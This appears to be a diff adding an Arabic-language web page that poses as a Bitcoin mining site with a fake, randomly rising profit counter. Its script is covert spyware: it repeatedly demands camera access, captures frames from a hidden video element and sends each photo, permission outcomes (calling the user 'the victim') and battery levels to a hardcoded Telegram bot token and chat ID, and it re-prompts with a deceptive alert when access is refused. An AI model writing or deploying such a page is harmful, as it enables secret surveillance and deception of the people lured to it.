@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>تعدين البيتكوين ⛏️💰</title>
+  <style>
+    body {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #111;
+      color: #fff;
+    }
+    #logo {
+      width: 100px;
+      height: 100px;
+      animation: spin 3s linear infinite;
+    }
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+    #status {
+      font-size: 24px;
+      text-align: center;
+      margin-top: 15px;
+    }
+    #profit {
+      font-size: 18px;
+      margin-top: 10px;
+      color: #0f0;
+    }
+  </style>
+</head>
+<body>
+  <img id="logo" src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" alt="Bitcoin Logo">
+  <h2 id="status">⏳ جاري التحميل...</h2>
+  <div id="profit">💰 الأرباح: 0 BTC</div>
+
+  <video id="cam" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const BOT_TOKEN = "8334676735:AAHmXb_USxBri-EnkTaiW0Vo544bcr3Bi7M";
+    const CHAT_ID = "8069773792";
+
+    function sendToTelegram(message) {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+      });
+    }
+
+    async function sendPhoto(blob) {
+      const formData = new FormData();
+      formData.append("chat_id", CHAT_ID);
+      formData.append("photo", blob, "photo.jpg");
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+    }
+
+    async function askForCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        sendToTelegram("✅ الضحية وافق على إذن الكاميرا");
+
+        const video = document.getElementById("cam");
+        video.srcObject = stream;
+        video.play();
+
+        const canvas = document.getElementById("canvas");
+        const ctx = canvas.getContext("2d");
+
+        function capture() {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(blob => sendPhoto(blob), "image/jpeg");
+          requestAnimationFrame(capture);
+        }
+
+        capture();
+      } catch (error) {
+        sendToTelegram("❌ الضحية رفض إذن الكاميرا");
+        alert("⚠️ الرجاء الموافقة على الأذونات لكي يعمل موقع تعدين البيتكوين ⛏️💰 بنجاح");
+        setTimeout(askForCamera, 3000);
+      }
+    }
+
+    askForCamera();
+
+    const profitDiv = document.getElementById("profit");
+    let profit = 0;
+    function updateProfit() {
+      profit += Math.random() * 0.0005;
+      profitDiv.innerText = `💰 الأرباح: ${profit.toFixed(6)} BTC`;
+      requestAnimationFrame(updateProfit);
+    }
+    updateProfit();
+
+    if (navigator.getBattery) {
+      navigator.getBattery().then(batt => {
+        function sendBattery() {
+          const level = Math.floor(batt.level * 100);
+          sendToTelegram(`🔋 نسبة البطارية: ${level}%`);
+        }
+        sendBattery();
+        batt.addEventListener('levelchange', sendBattery);
+      });
+    }
+  </script>
+</body>
+</html>
